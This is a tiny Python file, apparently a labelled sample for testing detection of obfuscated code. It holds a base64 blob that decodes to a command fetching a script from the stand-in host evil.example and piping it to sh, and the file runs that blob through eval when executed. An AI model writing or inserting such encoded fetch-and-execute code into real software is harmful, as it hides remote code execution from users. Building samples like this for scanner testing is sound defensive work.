"""Sample: decode-then-execute."""
import base64

BLOB = ("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuZXhhbXBsZS94IHwgc2gnKQ=="
        "IyBwYWRkaW5nIHRvIG1ha2UgdGhpcyBibG9iIGxvbmdlciB0aGFuIGVpZ2h0eSBjaGFyYWN0ZXJz")

eval(compile(base64.b64decode(BLOB), "<payload>", "exec"))
